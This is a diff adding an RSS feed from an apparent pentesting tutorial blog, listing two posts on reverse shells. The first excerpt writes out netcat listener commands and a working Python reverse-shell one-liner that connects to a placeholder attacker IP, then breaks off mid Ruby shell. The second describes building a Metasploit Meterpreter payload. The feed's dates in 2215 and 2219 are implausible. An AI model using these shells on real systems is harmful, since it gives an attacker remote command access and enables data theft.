@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Reverse on KCSEC</title>
+    <link>https://www.ivoidwarranties.tech/tags/reverse/</link>
+    <description>Recent content in Reverse on KCSEC</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <copyright>KCSEC</copyright>
+    <lastBuildDate>Thu, 16 Dec 2219 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="https://www.ivoidwarranties.tech/tags/reverse/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>Reverse Shells</title>
+      <link>https://www.ivoidwarranties.tech/posts/pentesting-tuts/pentesting-reverse-shells/</link>
+      <pubDate>Thu, 16 Dec 2219 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/pentesting-tuts/pentesting-reverse-shells/</guid>
+      <description>Step one - Setup your Listener on attacking machine.
+nc -lvp &amp;lt;Port&amp;gt; #Example nc -lvp 4444  You can then use netcat to connect to that listener or a different reverse shell from the Target.
+nc &amp;lt;attacker_ip&amp;gt; &amp;lt;port&amp;gt; #Example: nc -l -v 192.168.225.143 4444  Here is a listener setup with NETCAT but the reverse shell is PERL.
+PYTHON Reverse Shell
+python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;ATTACKER-IP&amp;quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;  RUBY Reverse Shell
+ruby -rsocket -e&#39;f=TCPSocket.</description>
+    </item>
+    
+    <item>
+      <title>Using Metasploit To Get A Reverse Shell</title>
+      <link>https://www.ivoidwarranties.tech/posts/pentesting-tuts/metasploit/simple-attack/</link>
+      <pubDate>Fri, 01 Sep 2215 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.ivoidwarranties.tech/posts/pentesting-tuts/metasploit/simple-attack/</guid>
+      <description>So using the Metasploit Framework you can create a malicious payload (Meterpreter Reverse Shell) and then setup a handler to receive this connection. By doing this you have a shell on the target machine which you can then escalate privileges, steal data or any other post exploitation.
+This images shows how reverse and bind shells work.
+First step is to setup a handler to receive the reverse connection. This can be done using the Metasploit Framework as shown bellow.</description>
+    </item>
+    
+  </channel>
+</rss>
